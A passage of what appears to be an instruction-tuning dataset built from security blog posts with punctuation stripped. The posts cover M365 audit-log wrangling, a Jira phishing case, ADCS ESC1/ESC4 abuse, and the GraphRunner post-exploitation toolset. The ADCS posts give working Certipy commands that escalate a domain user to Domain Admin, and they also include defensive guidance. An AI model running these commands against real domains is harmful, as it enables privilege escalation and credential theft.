SOF-ELK web UI It's alive You are now officially ready to wrangle the M365 UAL using SOF-ELK with all the flexibility accessibility and scale of EC2 Refer to part 1 for a refresher on how to export your data via PowerShell and query for your audit investigative purposes In the next and final part of this series we'll talk about what to do when you are faced with UAL export data in CSV which is not properly formatted for SOF-ELK ingestion Stay tuned and thanks for reading READ PART 1 PART 3"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Wrangling the M365 UAL with SOF-ELK and CSV Data (Part 3 of 3)</title>\n<taxonomies>How-To, Incident Response, Informational, InfoSec 201, Patterson Cake, Phishing, csv data, M365, Microsoft 365, SOF-ELK, UAL, Unified Audit Log</taxonomies>\n<creation_date>Thu, 07 Sep 2023 16:04:25 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Patterson Cake PART 1 PART 2 In part one of Wrangling the M365 UAL we talked about acquiring parsing and querying UAL data using PowerShell and SOF-ELK In part two we discussed leveraging AWS EC2 for greater flexibility and accessibility for SOF-ELK deployment Along the way we learned how to specifically format our exported UAL data for easy automated ingestion into SOF-ELK but what if the data you've acquired or were provided is not in the proper format Fortunately if we have the AuditData blob as part of a CSV export from Purview or PowerShell we can extract reformat and feed it to SOF-ELK for automatic parsing We are frequently called to investigate an incident that occurred days weeks even months prior and in many cases the customer or a third party pulled the UAL data from the M365 Purview aka Compliance Portal and provides it for our analysis Unfortunately the only export option from Purview is CSV and wrangling the data elements in the CSV via Excel or command-line parsing tools can be extremely onerous Armed with the information from Wrangling Part One about the data format SOF-ELK expects we can take the provided CSV pull out the AuditData blob change the encoding and we're back to efficient parsing and querying via SOF-ELK The first thing we need to do is extract the AuditData column from our CSV If you have Excel handy you can just open the CSV copy paste the AuditData column do not include the column title into a text editor and save it as a text file Sometimes CSVs can be large and unwieldy or you may not have Excel in which case we can turn to csvtool to extract the AuditData column via command line on Linux NOTE Although our CSV is comma separated the AuditData column contains commas which makes cutting on comma delimiter challenging Csvtool handles this nicely I'm using WSL Debian installing csvtool via sudo apt-get install csvtool sudo apt-get install csvtool Let's test our csvtool command just to validate our CSV column is correct as sometimes depending on how the UAL data was exported the AuditData column number may vary We're hoping to see the AuditData blob in its entirety csvtool col 6 your-csv-ual-data.csv head -n 2 Checking csvtool AuditData output Column 6 looks correct so we'll go ahead and extract all of column 6 to a text file this time omitting the AuditData column heading In the test above you may have noticed the standard CSV double-quotes around values containing spaces We'll need to remove these to create our SOF-ELK ingestible JSON file and remove the AuditData column heading csvtool col 6 pc-purview-export.csv -o pc-purview-audit-data.csv csvtool readable pc-purview-audit-data.csv sed '1d pc-purview-audit-data.json Now we just need to copy the file to our SOF-ELK ingestion directory changing the IP to match your SOF-ELK system scp pc-purview-audit-data.json elk_user 192.168.1.100 logstash microsoft365 pc-purview-audit-data.json If everything goes according to plan you should be able to check to see if your M365 indices show up in Elasticsearch within SOF-ELK You can do this via SSH and command line or check the web UI sof-elk_clear.py -i list Checking SOF-ELK Indices Checking SOF-ELK web UI What now You guessed it UAL wrangling time Go back to part one for some pointers or stick around for a couple additional SOF-ELK tidbits While I've got your attention I just wanted to point out two quick items of note relative to SOF-ELK geolocation and updates Neither is complicated and both are useful There is MaxMind geolocation data prepopulated in the current version of SOF-ELK but it is necessarily stale not useless but not up to date To remedy this visit MaxMind and sign-up for a GeoLite2 account or one of their other commercial solutions ww.maxmind.com en geolite2 signup Once you've done that you'll receive an account ID and can then generate a license key ww.maxmind.com en accounts current license-key To easily apply this to your SOF-ELK deployment and update the geolocation data just run the built-in geoip_bootstrap.sh script and enter your account info at the prompts You'll need to run this as root sudo su usr local sbin geoip_bootstrap.sh Setting up MaxMind SOF-ELK Configuration Lastly to keep your SOF-ELK installation up to date you can run the built-in sof-elk_update.sh script which must also be run as root As previously mentioned we've only scratched the surface on SOF-ELK's utility When you get a moment do an ls logstash from your SOF-ELK system and ponder the log-wrangling possibilities aws azure gcp etc Viewing SOF-ELK's Ingestion Possibilities Until next time thank you very much for reading READ PART 1 PART 2"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Stop Phishing Yourself: How Auto-Forwarding and Exchange Contacts Can Stab You in the Back</title>\n<taxonomies>Blue Team, Hayden Covington, Hunt Teaming, Informational, Phishing</taxonomies>\n<creation_date>Thu, 21 Sep 2023 16:39:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Hayden Covington Phishing is an ever-present threat but lately user education and spam filters have helped mitigate some of that threat But what happens when a phish makes it further than the user's mailbox and deeper into your own environment Can users be expected to have the same level of caution The event covered in this post is a real event that I discovered while hunting through O365 logs for our SOC customers For the sake of clarity throughout this blog post I'm going to refer to Microsoft 365 as O365 since that is how our log fields are currently labeled I will also be redacting the email domains so I'll refer to the customer domain as customer.com when necessary When I first discovered this event I was looking for emails that O365 had marked as phishing but still delivered rather than blocked or quarantined There could be a few reasons for this occurring like a retroactive phishing verdict or an exception for certain mailboxes o365.audit.Verdict Phish and o365.audit.DeliveryAction Delivered What I found was quite a lot of spam emails that were related to marketing O365 was marking tens of thousands of emails as phishing simply due to spoofed sender addresses by email marketing services This is fairly common as you want your recipients to see your own email domain as the sender rather than the domain of the service you're using to send these emails To narrow the results down further I began experimenting with excluding various field values to narrow down my search results I'll spare you the details of my trial-and-error because that is when I found the events that inspired this blog post Take a look at the screencap of the logs below A few important things from that image to take note of The P1Sender field is a marketing email service domain The P2Sender field is actually the customer's address of accounting customer.com The emails are all marked as phishing and have been blocked and quarantined The O365 policy states that these emails are an IntraOrgPhish To quickly explain the difference between P1Sender and P2Sender the P1Sender is the MAIL FROM address which in simple terms can usually be understood as the true sender of the email The P2Sender is the From address which is displayed in your email client as who the email is from In this example the accounting email address of the customer is being spoofed as the From address This is also likely the reason for the marking of IntraOrgPhish Now hopefully having understood that we shouldn't be terribly worried All these emails were blocked and quarantined Looking at the sender addresses it doesn't look like a true intra-organizational phishing attack so all seems fine Later on we can pull the emails if we want some artifacts but otherwise there's nothing requiring much of a response here given how commonplace phishing emails like this are However Due to my morbid curiosity I dug a little deeper and found this A number of these emails were sent to an Atlassian email linked to a Jira project and these emails were not blocked or quarantined even though they were classified as phishing Rather they were marked as outbound spam But what is the difference here I'll give you a hint it's not either of the sender addresses The P1Sender stays as the same email marketing domain and the P2Sender is still accounting company.com So why the different response from O365 It turns out this accounting email address is unsurprisingly an email distribution list for the company in question and this email distro has a member that is an Exchange Contact for forwarding and creating issues in Jira This Exchange Contact facilitated the forwarding of these phishing emails to Jira and with the emails now being outbound rather than inbound O365 classified these as outbound spam and allowed them through This is where things get concerning These emails were forwarded malicious attachments and all to a Jira project creating Jira issues with those attachments included and attached within Jira If you don't quite grasp the weight of this issue immediately consider this a user might be hesitant to open an attachment in a random email but would they be just as hesitant to open an attachment in a Jira ticket assigned to them Luckily we caught this issue quickly that same day We were able to have these Jira tickets deleted from the project and created an Elastic detection to alert us of phishing attachments being forwarded to Atlassian But most importantly we didn't find any log events to indicate anyone opened that attachment or visited any of the links within To summarize the message of this blog post I recommend that you carefully review and understand how you forward emails to your ticketing systems you could very well be phishing your own users As I mentioned earlier even someone who is well-educated on the threats of phishing may not expect that phish to be sitting inside of one of their work items What can you do about this besides deleting Jira and returning to sticky notes and carrier pigeons for project management On our side a member of the BHIS systems team created a service account for one of our own email distros and connected it to our ticketing system This allows for emails to be pulled from the inboxes rather than being forwarded to a contact which seemed to be the root cause of this issue If you're looking for how to do this for Jira you might find this link helpful upport.atlassian.com jira-service-management-cloud docs add-an-email-account As a bonus if you've read this far here is part of what was in the malicious .html file As you might have already guessed the file was a fake login page designed to be a credential harvester While a cred harvester still might not have tricked a user within Jira can we say the same if this was a macro-enabled excel workbook I would prefer not to tempt that fate"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Abusing Active Directory Certificate Services - Part One</title>\n<taxonomies>Alyssa Snow, Blue Team, External/Internal, How-To, Informational, Red Team, Red Team Tools, Active Directory, exploit</taxonomies>\n<creation_date>Thu, 05 Oct 2023 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Alyssa Snow Active Directory Certificate Services ADCS 1 is used for public key infrastructure in an Active Directory environment ADCS is widely used in enterprise Active Directory environments for managing certificates for systems users applications and more In 2021 SpecterOps published a white paper that described ADCS in-depth along with ADCS misconfigurations and vulnerabilities2 that can be abused for credential theft domain escalation and persistence This white paper took a deep dive into attack techniques for ADCS and provided guidance on how to prevent detect and respond to such attacks This blog post will not cover all techniques discussed in the white paper I highly recommend reviewing both the white paper and the shortened blog post written by Will Schroeder and Lee Christensen A link to the white paper3 and SpecterOps blog post4 can be found in the resources listed at the end of this post Tools Since the white paper came out several tools have been published to help identify vulnerabilities and exploit Active Directory Certificate Services Similarly tools have been published to help blue teamers identify and remediate these issues This blog post is the start of a short series that will cover ADCS attacks primarily using Certipy ithub.com ly4k Certipy Certipy is a Python-based offensive security tool that can be used to enumerate and abuse vulnerable ADCS Certipy is the tool I use most often but I have listed a few other related tools below PKINITtools ithub.com dirkjanm PKINITtools PyWhisker ithub.com ShutdownRepo pywhisker Certi ithub.com zer1t0 certi Impacket ithub.com fortra Impacket Certify ithub.com GhostPack Certify Abusing Misconfigured Templates Certificate templates are Active Directory objects used to define certificate policies In the certificate template an admin can specify settings such as the subject the identity validity period and purpose as well as users authorized to request a certificate Users authorized in the template settings can request a certificate based on configurations defined in the certificate template Users authorized to request a certificate can be defined using a descriptor on the Certificate Authority itself and in the certificate template object To enumerate ADCS template information from your target domain you need valid domain credentials Based on my experience enumeration of ADCS does not usually require a highly privileged domain account Any domain credential can typically be used to query ADCS templates and configuration details In the following example let's imagine that we have gained a foothold in our target company FOOBAR's internal network and have compromised the account of a user with the name billy We want to enumerate the ADCS configuration for the internal target domain foobar.com To enumerate ADCS configurations with Certipy use the find command By specifying the -enabled and -vulnerable flags we can tell Certipy to specifically print out vulnerable templates that are enabled The full Certipy command is shown below certipy find -u 'billy foobar.com -p -dc-ip -vulnerable -enabled Certipy outputs the configuration details of interest in JSON JavaScript Object Notation and TXT files following the naming convention _Certipy as shown in the figure below Certipy also runs BloodHound collectors which output to a zip file following the same naming convention The BloodHound results can be imported into your BloodHound database and used to obtain a visual of potential domain privilege escalation paths BloodHound is out of scope for this particular blog post However if you are interested in leveraging this feature here are a couple things to note At the time of writing Certipy generates BloodHound data that can only be ingested by a fork of BloodHound found here ithub.com ly4k BloodHound To use BloodHound maintained at ithub.com BloodHoundAD BloodHound you need to specify the -old-bloodhound flag Find Vulnerable Templates A simple grep command using search terms like ESC can be used to check the resulting TXT file for escalation opportunities discovered by Certipy For example we can check the file for ESC1 as follows Grep for ESC1 ESC1 A certificate template with the ESC1 vulnerability allows low privileged users to enroll and request a certificate on behalf of any domain object specified by the user This means that any user with enrollment rights can request a certificate for a privileged account such as a domain administrator Templates vulnerable to ESC1 have the following configurations Client Authentication True Enabled True Enrollee Supplies Subject True Requires Management Approval False Authorized Signatures Required 0 Upon investigating the Certipy output file 20230602164801_Certipy.txt we notice that Certipy found an ESC1 vulnerability on the first template called FOO_Templ All conditions for ESC1 are met by the FOO_Templ template ESC1 Template As shown in the figure below the Permissions section of the vulnerable template states that users in the Domain Users or Authenticated Users groups can enroll This means that any domain user can request a certificate on behalf of a Domain Admin FOO_Templ Permissions Our compromised user account billy is a part of the Domain Users group and therefore is authorized to request a certificate using the vulnerable template We can request a certificate for Dan the DA by setting the user's principal name UPN to DA_Dan foobar.com The Certipy arguments required to request a certificate are as follows u username p compromised user password dc-ip domain controller IP address target target CA Certificate Authority DNS Domain Name System Name ca short CA Name template vulnerable template name upn target user object name The full Certipy command is shown below certipy req -u 'billy foobar.com -p -dc-ip '10.10.1.100 -target foobar-CA.foobar.com -ca 'foobar-CA -template 'FOO_Templ -upn 'DA_Dan foobar.com Note The Certipy results will return the request ID or an Object SID Note this as you will need this information to revoke the certificate once the test is completed Get Certificate for DA_Dan As shown in the figure above our certificate and private key are stored in the DA_Dan.pfx file Troubleshooting Sidebar If this does not work and you receive an error that says something like SMB Server Message Block SessionError STATUS_NOT_SUPPORTED You can try to use Kerberos authentication instead of username and password Gabriel Prud'homme vendetce taught me this work around so if it works for you hit him up and tell him how dope he is To get a service ticket for your user you can use Impacket's getTGT module ithub.com fortra impacket blob impacket_0_10_0 examples getTGT.py python3 getTGT.py 'foobar.com billy Get TGT After you run the command above you will be prompted for the password for your user and the module will return a CCache file with the name .ccache Export the resulting CCache file to an environment variable like so Make sure to include the full path to your CCache file export KRB5CCNAME full path to billy.ccache To request a certificate using Kerberos authentication the command will be similar to the previous except we will use -k for use Kerberos authentication and -no-pass The full Certipy command is shown below certipy req -u 'billy foobar.com -k -no-pass -dc-ip '10.10.1.100 -target foobar-CA.foobar.com -ca 'foobar-CA -template 'FOO_Templ -upn 'DA_Dan foobar.com End Sidebar Once we have our certificate we can use the certificate to obtain the credential hash and a Kerberos ticket of the target DA account using the Certipy -auth command as shown below certipy auth -pfx DA_Dan.pfx As shown in the figure below we successfully retrieved the hash for the DA_Dan account Now we can impersonate DA_Dan Get DA_Dan Credentials In summary due to the overly permissive ADCS template we were able to escalate from a normal domain account to a Domain Administrator account Validity Period It is important to note that the certificate obtained will be valid for the DA account until the validity period ends unless the certificate is explicitly revoked Let's look at the vulnerable template again As we can see in the figure below the template specifies a validity period of 5 years Validity Period This means that we will have access to DA Dan's account for the next five years regardless of any password changes We can also renew the certificate before the expiration date to maintain access to the account Which means that this technique is not only a handy privilege escalation technique but could serve as a means of persistence as well I have observed certificate templates with validity periods of 1-10 years I typically see templates with a validity period of 3-5 years This may be a common practice or a default configuration it may not this is just based on what I have observed in various enterprise environments that I have tested Prevention and Detection So what can we do to prevent and detect such attacks Here are a few steps you can take to harden your certificate templates Take stock of your certificate templates and determine whether all enabled templates are currently in use Disable all templates that are unnecessary Make sure that template permissions are as restrictive as possible Only grant necessary groups users enrollment permissions Modify the Issuance Requirements to require the manual approval of an issued certificate where possible Disable the Enrollee Supplies Subject flag where possible Remove Client Authentication where possible Monitoring By monitoring certificate enrollment events for users you can detect when an account requests a certificate and when your CA issues a certificate By monitoring certificate enrollment events an administrator can alert on anomalous behavior and revoke certificates that appear to be malicious or suspicious Some useful event IDs can be found below 4886 Request for certificate 4887 Certificate Issued 4768 Request for Kerberos ticket TGT Defensive Resources Defensive Guidance section of Certified_Pre-Owned5 Microsoft PKI defensive guidance earn.microsoft.com en-us previous-versions windows it-pro windows-server-2012-r2-and-2012 dn786443 v ws.11 PKIAudit ithub.com GhostPack PSPKIAudit Additional Resources earn.microsoft.com en-us previous-versions windows it-pro windows-server-2012-r2-and-2012 hh831740 SpecterOps Whitepaper pecterops.io wp-content uploads sites 3 2022 06 Certified_Pre-Owned.pdf SpecterOps Blog Post osts.specterops.io certified-pre-owned-d95910965cd2 pecterops.io wp-content uploads sites 3 2022 06 an_ace_up_the_sleeve.pdf ww.securew2.com blog how-to-revoke-certificate-in-windows-ad-cs ww.thehacker.recipes ad movement ad-cs certificate-templates irkjanm.io ntlm-relaying-to-ad-certificate-services PKINITtools ithub.com dirkjanm PKINITtools PyWhisker ithub.com ShutdownRepo pywhisker Certi ithub.com zer1t0 certi Impacket ithub.com fortra Impacket Certipy ithub.com ly4k Certipy Certify ithub.com GhostPack Certify Footnotes 1 earn.microsoft.com en-us previous-versions windows it-pro windows-server-2012-r2-and-2012 hh831740 v ws.11 2 pecterops.io wp-content uploads sites 3 2022 06 Certified_Pre-Owned.pdf 3 pecterops.io wp-content uploads sites 3 2022 06 Certified_Pre-Owned.pdf 4 osts.specterops.io certified-pre-owned-d95910965cd2 5 pecterops.io wp-content uploads sites 3 2022 06 Certified_Pre-Owned.pdf READ PART 2"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Abusing Active Directory Certificate Services  Part 2</title>\n<taxonomies>Alyssa Snow, Blue Team, External/Internal, How-To, Informational, Red Team, Red Team Tools, Active Directory, exploit</taxonomies>\n<creation_date>Thu, 12 Oct 2023 15:44:18 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Alyssa Snow Misconfigurations in Active Directory Certificate Services ADCS can introduce critical vulnerabilities into an Enterprise Active Directory environment such as paths of escalation from low privileged accounts to domain administrator In PART ONE of this short ADCS series we introduced Active Directory Certificate Services at a high level and walked through one of the escalation techniques ESC1 In this post we will walk through the escalation technique ESC4 using Certipy ESC4 This issue occurs when a certificate template can be modified by a non-administrator account This misconfiguration can occur when unintended users are granted one of the following template security permissions Owner WriteOwnerPrincipals WriteDaclPrincipals WritePropertyPrincipals Example In the following example let's imagine that we have gained a foothold in our target company FOOBAR's internal network and have compromised the account of a user with the name billy we have enumerated the ADCS configuration for the internal target domain foobar.com As shown in the figure below the ESC4Certificate_FOOBAR template was configured to grant the Domain Users group with Write Owner Principals and Write Property Principals permissions This means that any foobar.com user has permission to modify any given property in the template ESC4 Template Our compromised user account billy is a part of the Domain Users group and therefore is authorized to modify the template configuration.We can introduce escalation conditions using the following Certipy command certipy template -u billy foobar.com -p REDACTED -template ESC4Certificate_FOOBAR -dc-ip -save-old Certipy Results As shown in the figure above the original template was saved in the ESC4Certificate_FOOBAR.json We can use the configuration file to easily revert the template configuration to its original state once we've completed this attack The target template was updated to meet the following ESC1 conditions Client Authentication True Enabled True Enrollee Supplies Subject True Requires Management Approval False Authorized Signatures Required 0 In addition the template Validity Period was increased from 4 years to 5 years Now this vulnerable template can be used by any domain user to request a certificate on behalf of any other domain account The modified template is shown below Modified Vulnerable Certificate To demonstrate this we can request a certificate for Dan the DA by setting the user principal name UPN to DA_Dan foobar.com certipy req -u 'billy foobar.com -p 'REDACTED -dc-ip '10.10.1.100 -target 'foobar-CA.foobar.com -ca 'foobar-CA -template 'ESC4Certificate_FOOBAR -upn 'DA_Dan foobar.com Note The Certipy results will return the request ID or an Object SID Note this as you will need this information to revoke the certificate once the test is completed Request Certificate for Domain Admin Once we have our certificate we can use the certificate to obtain the credential hash and a Kerberos ticket of the target DA account using the Certipy -auth command as shown below certipy auth -pfx DA_Dan.pfx As shown in the figure below we successfully retrieved the hash for the DA_Dan account Now we can impersonate DA_Dan Get DA_Dan Credentials In summary the template ESC4Certificate_FOOBAR was configured to allow users from the Domain Users group non-Administrator accounts to modify the template configuration This allowed the standard domain user Billy to modify the template ESC4Certificate_FOOBAR and introduce vulnerabilities that allowed escalation from a normal domain account to a Domain Administrator account Clean Up To restore the template configuration to its original state use the following template command certipy template -u user foobar.com -p REDACTED -template ESC4Certificate_FOOBAR -dc-ip --configuration 'ESC4Certificate_FOOBAR.json Revert Template to Original Configuration Prevention and Detection So what can we do to prevent and detect such attacks Here are a few steps to harden your certificate templates Take stock of your certificate templates and determine whether all enabled templates are currently in use Disable all templates that are unnecessary Make sure that template permissions are as restrictive as possible Only grant necessary groups users enrollment permissions Only grant necessary groups users permission to modify template properties Modify the Issuance Requirements to require the manual approval of an issued certificate where possible Disable the Enrollee Supplies Subject flag where possible Remove Client Authentication where possible Monitoring It's uncommon for certificate templates to be changed regularly Detections should be built around unexpected template configuration changes Event IDs 4900 and 4899 occur when an ADCS object changes and enrollment occurs.By monitoring certificate change events an administrator can alert on anomalous behavior investigate template changes and revoke certificates that appear to be malicious or suspicious Some useful event IDs can be found below 4900 Security permissions for a certificate template changed 4899 Certificate template was updated 4886 Request for certificate 4887 Certificate Issued 4768 Request for Kerberos ticket TGT Defensive Resources Defensive Guidance section of Certified_Pre-Owned Microsoft PKI defensive guidance earn.microsoft.com en-us previous-versions windows it-pro windows-server-2012-r2-and-2012 dn786443 v ws.11 PKIAudit ithub.com GhostPack PSPKIAudit Additional Resources earn.microsoft.com en-us previous-versions windows it-pro windows-server-2012-r2-and-2012 hh831740 SpecterOps Whitepaper pecterops.io wp-content uploads sites 3 2022 06 Certified_Pre-Owned.pdf SpecterOps Blog Post osts.specterops.io certified-pre-owned-d95910965cd2 pecterops.io wp-content uploads sites 3 2022 06 an_ace_up_the_sleeve.pdf ww.securew2.com blog how-to-revoke-certificate-in-windows-ad-cs ww.thehacker.recipes ad movement ad-cs certificate-templates irkjanm.io ntlm-relaying-to-ad-certificate-services PKINITtools ithub.com dirkjanm PKINITtools PyWhisker ithub.com ShutdownRepo pywhisker Certi ithub.com zer1t0 certi Impacket ithub.com fortra Impacket Certipy ithub.com ly4k Certipy Certify ithub.com GhostPack Certify"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Introducing GraphRunner: A Post-Exploitation Toolset for Microsoft 365</title>\n<taxonomies>Beau Bullock, How-To, Red Team, Red Team Tools, Steve Borosh, Azure, cloud, microsoft365</taxonomies>\n<creation_date>Thu, 19 Oct 2023 17:59:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "By Beau Bullock Steve Borosh TL DR We built a post-compromise toolset called GraphRunner for interacting with the Microsoft Graph API It provides various tools for performing reconnaissance persistence and pillaging of data from a Microsoft Entra ID Azure AD account Below are some of the main features At the end of the blog post make sure to take a peek at the potential attack path scenarios we have laid out There are a few in there we think may be quite interesting to both offensive and defensive security team members Main Features Search and export email Search and export SharePoint and OneDrive files accessible to a user Search all Teams chats and channels visible to the user and export full conversations Deploy malicious apps Discover misconfigured mailboxes that are exposed Clone security groups to carry out watering hole attacks Find groups that can be modified directly by your user or where membership rules can be abused to gain access Search all user attributes for specific terms Leverage a GUI built on the Graph API to pillage a user's account Dump conditional access policies Dump app registrations and external apps including consent and scope to identify potentially malicious apps Tools to complete OAuth flow during consent grant attacks Continuously refresh your token package GraphRunner doesn't rely on any third-party libraries or modules Works with Windows and Linux You can find GraphRunner here ithub.com dafthack GraphRunner The Graph API The Microsoft Graph API is undeniably one of the most important pieces of infrastructure to enable Microsoft cloud services to function Everything from Outlook to SharePoint to Teams to Entra ID rely on this API Most of the time when you are interacting with Microsoft services you never visually see the Graph API but under the hood it is constantly being utilized There are PowerShell modules that use it such as the MSOnline or AzureAD modules The AZ command line tool az cli also uses it As an administrator the Graph API is a very powerful tool for carrying out tasks in Azure But what about as a normal user During penetration tests red team engagements cloud assessments and other offensive security assessments there are often times where we obtain access to an M365 user's account This could be due to various attacks such as password spraying or phishing being successful Through a web browser we may be able to access certain resources like email and file sharing services But there are many other data points that can be collected from a Microsoft tenant besides email and files The Azure Entra Portal is a good place to start but it can easily be locked down so that only administrative users can utilize it Luckily access to the Graph API is necessary for much of Microsoft 365 to function Even when access to the Azure Portal is blocked most of the same data can be accessed via the API and in some cases interacted with Through performing offensive engagements we have found ourselves in this situation many times In exploring what the API has to offer through real-world engagements as well as R D sessions a toolset began to be developed internally at BHIS In this blog post you will find a thorough description of each piece of the toolset we are releasing Additionally we present several attack path scenarios to demonstrate situations where you may find this toolset useful Some of these attack paths may be familiar while others may not Our goal in releasing this toolset is primarily to provide offensive operators the tools they need to quickly identify security issues in Microsoft cloud environments But this tool can also be leveraged by defenders to preemptively identify security issues and mitigate them Now let's dive into what GraphRunner is all about There are three main pieces to GraphRunner GraphRunner.ps1 A PowerShell script containing a number of modules for post-compromise recon persistence and pillaging of an account GraphRunnerGUI.html An HTML graphic user interface to be used with an access token Provides various modules around enumeration and pillaging data from services such as Outlook SharePoint OneDrive and Teams PHPRedirector -A basic PHP script that can be used to capture OAuth authorization codes during an OAuth consent flow and a Python script to automatically complete the flow to obtain access tokens GraphRunner PowerShell GraphRunner includes a PowerShell set of tools to assist with carrying out various attacks during post-exploitation of a Microsoft Entra ID Azure AD tenant Most of the modules rely on having authenticated access tokens To assist with this there are multiple modules for obtaining and working with both user and application service principal tokens The majority of modules don't require a privileged account To get started import GraphRunner into a new PowerShell session Import-Module GraphRunner.ps1 Here's a high-level summary of each module included in the PowerShell script Authentication Get-GraphTokens Authenticate as a user to Microsoft Graph Invoke-RefreshGraphTokens Use a refresh token to obtain new access tokens Get-AzureAppTokens Complete OAuth flow as an app to obtain access tokens Invoke-RefreshAzureAppTokens Use a refresh token and app credentials to refresh a token Invoke-AutoTokenRefresh Refresh tokens at an interval Recon Enumeration Modules Invoke-GraphRecon Performs general recon for org info user settings directory sync settings etc Invoke-DumpCAPS Gets conditional access policies Invoke-DumpApps Gets app registrations and external enterprise apps along with consent and scope info Get-AzureADUsers Gets user directory Get-SecurityGroups Gets security groups and members Get-UpdatableGroups Gets groups that may be able to be modified by the current user Get-DynamicGroups Finds dynamic groups and displays membership rules Get-SharePointSiteURLs Gets a list of SharePoint site URLs visible to the current user Invoke-GraphOpenInboxFinder Checks each user's inbox in a list to see if they are readable Get-TenantID Retrieves the tenant GUID from the domain name Persistence Modules Invoke-InjectOAuthApp Injects an app registration into the tenant Invoke-SecurityGroupCloner Clones a security group while using an identical name and member list but can inject another user as well Invoke-InviteGuest Invites a guest user to the tenant Invoke-AddGroupMember Adds a member to a group Pillage Modules Invoke-SearchSharePointAndOneDrive Search across all SharePoint sites and OneDrive drives visible to the user Invoke-ImmersiveFileReader Open restricted files with the immersive reader Invoke-SearchMailbox Has the ability to do deep searches across a user's mailbox and can export messages Invoke-SearchTeams Can search all Teams messages in all channels that are readable by the current user Invoke-SearchUserAttributes Search for terms across all user attributes in a directory Get-Inbox Gets the latest inbox items from a mailbox and can be used to read other user mailboxes shared Get-TeamsChat Downloads full Teams chat conversations Invoke-GraphRunner Module Invoke-GraphRunner Runs Invoke-GraphRecon Get-AzureADUsers Get-SecurityGroups Invoke-DumpCAPS Invoke-DumpApps and then uses the default_detectors.json file to search with Invoke-SearchMailbox Invoke-SearchSharePointAndOneDrive and Invoke-SearchTeams Supplemental Modules Invoke-AutoOAuthFlow Automates the OAuth flow completion to obtain access and refresh keys when a user grants consent to an app registration Invoke-DeleteOAuthApp Delete an OAuth App Invoke-DeleteGroup Delete a group Invoke-RemoveGroupMember Module for removing users members from groups Invoke-DriveFileDownload Has the ability to download single files from SharePoint and OneDrive as the current user Invoke-CheckAccess Check if tokens are valid Invoke-HTTPServer A basic web server to use for accessing the emailviewer that is output from Invoke-SearchMailbox Invoke-BruteClientIDAccess Test different client_id's against MSGraph to determine permissions Invoke-ImportTokens Import tokens from other tools for use in GraphRunner Get-UserObjectID Retrieves an Object ID for a user Authentication A good place to start is to authenticate with the Get-GraphTokens module This module will launch a device-code login allowing you to authenticate the PowerShell session from a browser session Access and refresh tokens will be written to the global tokens variable and your tenant ID will be written to the tenantid variable To use them with other GraphRunner modules use the Tokens flag Example Invoke-DumpApps -Tokens tokens Enter the code at microsoft.com devicelogin to authenticate your session Access tokens typically have an expiration time of one hour so it will be necessary to refresh them occasionally If you have already run the Get-GraphTokens command your refresh tokens will be utilized from the tokens variable automatically when you run Invoke-RefreshGraphTokens to obtain a new set of tokens GraphRunner also includes modules for authenticating as a service principal This can be useful for leveraging an app registration as detailed later in the Persistence section in this blog post The Get-AzureAppTokens module can assist with completing an OAuth flow to obtain access tokens for an Azure App Registration After obtaining an authorization code it can be utilized with a set of app registration credentials client id and secret to complete the flow Recon Enumeration GraphRunner includes a number of reconnaissance modules to determine configuration settings list objects and identify attack paths in a tenant The Invoke-GraphRecon module gathers general information about the tenant including the primary contact info directory sync settings and user settings such as if users have the ability to create apps create groups or consent to apps The primary contact information for the tenant is displayed along with directory sync settings and user settings The authorization policy section includes configuration settings such as if users can read their own Bitlocker keys who can invite external users if MSOL PowerShell is blocked and more The Invoke-GraphRecon module also has a switch called PermissionEnum If this switch is set it will use an undocumented Estimate Access API to brute force a list of almost 400 actions permissions reference earn.microsoft.com en-us azure active-directory roles permissions-reference to determine what actions the current user is allowed to do This is useful for discovering what unique actions your user is able to perform in the tenant Additionally when we get into the group editing section later in the blog post this method is useful for helping determine what access may have changed The Invoke-DumpCAPS module dumps conditional access policies from a tenant This module uses the legacy Azure Active Directory Graph API 